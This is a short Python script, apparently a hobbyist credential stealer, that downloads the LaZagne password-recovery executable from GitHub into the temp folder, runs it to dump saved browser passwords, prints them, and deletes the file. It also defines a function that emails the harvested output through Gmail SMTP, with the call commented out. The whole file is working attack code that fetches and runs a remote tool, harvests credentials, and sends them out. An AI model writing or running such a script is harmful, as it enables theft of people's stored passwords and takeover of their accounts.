#!/usr/bin/env python

import requests, smtplib, os, subprocess, tempfile

url = "https://github.com/alessandroz/lazagne/releases/download/2.4/laZagne.exe"

email = "your@email.com"
password = "pAssW0rd"

# downloaded_file = ""

def download(url):
    get_file = requests.get(url)
    downloaded_file = url.split('/')[-1]
    with open(downloaded_file, 'wb') as stealer:
        stealer.write(get_file.content)


def send_email(email, password, content):
    sender = smtplib.SMTP("smtp.gmail.com", 587)
    sender.starttls()
    sender.login(email, password)
    sender.sendmail(email, email, content)
    sender.quit()
    
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download(url)

exec_cmnd = subprocess.check_output("laZagne.exe browsers", shell=True)
print(exec_cmnd)

# send_email(email, password, exec_cmnd)

os.remove('laZagne.exe')